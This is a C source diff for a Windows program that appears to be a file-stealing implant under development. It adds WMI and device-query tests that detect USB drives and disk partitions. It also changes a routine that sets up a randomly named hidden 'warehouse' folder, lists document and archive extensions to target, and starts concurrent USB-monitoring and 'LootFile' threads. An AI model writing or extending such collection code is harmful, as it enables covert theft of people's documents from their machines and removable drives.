@@ -2731,12 +2731,112 @@ VOID Callback156
 	_In_ LPVOID Arg
 )
 {
-	MessageBoxW(NULL, lpInput, L"Title", MB_OK);
+	LPWSTR lpTemp = NULL;
+	lpTemp = SearchMatchStrW(lpInput, L"DeviceID = \"\\\\\\\\.\\\\PHYSICALDRIVE", L"\";\n");
+	MessageBoxW(NULL, lpTemp, L"Title", MB_OK);
 }
 
 void test156(void) {
-	RegisterAsyncEvent(L"Select * FROM __InstanceOperationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_DiskDrive' AND (TargetInstance.InterfaceType='USB')", Callback156, NULL);
+	//RegisterAsyncEvent(L"Select * FROM __InstanceOperationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_DiskDrive' AND (TargetInstance.InterfaceType='USB')", Callback156, NULL);
+	RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_DiskDrive' AND (TargetInstance.InterfaceType='USB')", Callback156, NULL);
 	Sleep(100000000);
+}
+
+void test157(void) {
+	WCHAR wszTemp[0x100];
+
+	QueryDosDeviceW(L"E:", wszTemp, _countof(wszTemp));
+	PrintFormatW(L"%s\n", wszTemp);
+}
+
+void test158(void) {
+	DWORD dwDriveType = GetDriveTypeW(L"E:\\");
+	PrintFormatW(L"%d\n", dwDriveType);
+}
+
+void test159(void) {
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	STORAGE_HOTPLUG_INFO HotPlugInfo;
+	DWORD dwBytesReturned = 0;
+
+	hFile = CreateFileW(L"\\\\.\\C:", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		LOG_ERROR("CreateFileW", GetLastError());
+		goto CLEANUP;
+	}
+
+	SecureZeroMemory(&HotPlugInfo, sizeof(HotPlugInfo));
+	if (!DeviceIoControl(hFile, IOCTL_STORAGE_GET_HOTPLUG_INFO, NULL, 0, &HotPlugInfo, sizeof(HotPlugInfo), &dwBytesReturned, NULL)) {
+		LOG_ERROR("DeviceIoControl", GetLastError());
+		goto CLEANUP;
+	}
+
+	PrintFormatW(L"%d\n", HotPlugInfo.MediaRemovable);
+	PrintFormatW(L"%d\n", HotPlugInfo.DeviceHotplug);
+CLEANUP:
+	if (hFile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hFile);
+	}
+
+	return;
+}
+
+BOOL Test160Callback
+(
+	_In_ IWbemClassObject* pObject,
+	_In_ LPVOID* Args
+)
+{
+	HRESULT hResult = S_OK;
+	VARIANT DeviceID;
+
+	SecureZeroMemory(&DeviceID, sizeof(DeviceID));
+	hResult = pObject->lpVtbl->Get(pObject, L"DeviceID", 0, &DeviceID, 0, 0);
+	if (FAILED(hResult)) {
+		LOG_ERROR("pObject->Get", hResult);
+		goto CLEANUP;
+	}
+
+	if (DeviceID.vt != VT_BSTR) {
+		goto CLEANUP;
+	}
+
+	PrintFormatW(L"%s\n", DeviceID.bstrVal);
+CLEANUP:
+	return FALSE;
+}
+
+void test160(void) {
+	WmiExec(L"SELECT * FROM Win32_DiskPartition", Test160Callback, NULL);
+}
+
+BOOL Callback161
+(
+	_In_ IWbemClassObject* pObject,
+	_In_ LPVOID* Args
+)
+{
+	HRESULT hResult = S_OK;
+	VARIANT DeviceID;
+
+	SecureZeroMemory(&DeviceID, sizeof(DeviceID));
+	hResult = pObject->lpVtbl->Get(pObject, L"Antecedent", 0, &DeviceID, 0, 0);
+	if (FAILED(hResult)) {
+		LOG_ERROR("pObject->Get", hResult);
+		goto CLEANUP;
+	}
+
+	if (DeviceID.vt != VT_BSTR) {
+		goto CLEANUP;
+	}
+
+	PrintFormatW(L"%s\n", DeviceID.bstrVal);
+CLEANUP:
+	return FALSE;
+}
+
+void test161(void) {
+	WmiExec(L"SELECT * FROM Win32_LogicalDiskToPartition", Callback161, NULL);
 }
 
 BOOL IsExist
@@ -2837,7 +2937,6 @@ VOID Final(VOID)
 	LPWSTR lpTemp = NULL;
 	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
 	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
-	WCHAR wszUserProfile[MAX_PATH];
 	DWORD i = 0;
 
 #ifndef _DEBUG
@@ -2877,7 +2976,7 @@ VOID Final(VOID)
 	}
 
 	ExpandEnvironmentStringsW(L"%ALLUSERSPROFILE%", pGlobalConfig->wszWarehouse, _countof(pGlobalConfig->wszWarehouse));
-	ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
+	/*ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
 	pGlobalConfig->dwNumberOfMonitoredFolder = 3;
 	pGlobalConfig->MonitoredFolder = ALLOC(sizeof(LPWSTR) * pGlobalConfig->dwNumberOfMonitoredFolder);
 	for (i = 0; i < pGlobalConfig->dwNumberOfMonitoredFolder - 1; i++) {
@@ -2891,7 +2990,7 @@ VOID Final(VOID)
 		FREE(pGlobalConfig->MonitoredFolder[2]);
 		pGlobalConfig->dwNumberOfMonitoredFolder--;
 		pGlobalConfig->MonitoredFolder[2] = NULL;
-	}
+	}*/
 
 	lpTemp = GenRandomStrW(8);
 	lstrcatW(pGlobalConfig->wszWarehouse, L"\\");
@@ -2908,7 +3007,8 @@ VOID Final(VOID)
 #endif
 
 	if (pGlobalConfig->Loot) {
-		MonitorUsb(pGlobalConfig);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUsb, pGlobalConfig, 0, &dwThreadId);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFile, pGlobalConfig, 0, &dwThreadId);
 	}
 	
 	Sleep(1000000000);
@@ -3227,7 +3327,12 @@ int main(void)
 	//test153();
 	//test154();
 	//test155();
-	test156();
+	//test156();
+	//test157();
+	//test158();
+	//test159();
+	//test160();
+	test161();
 	//Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
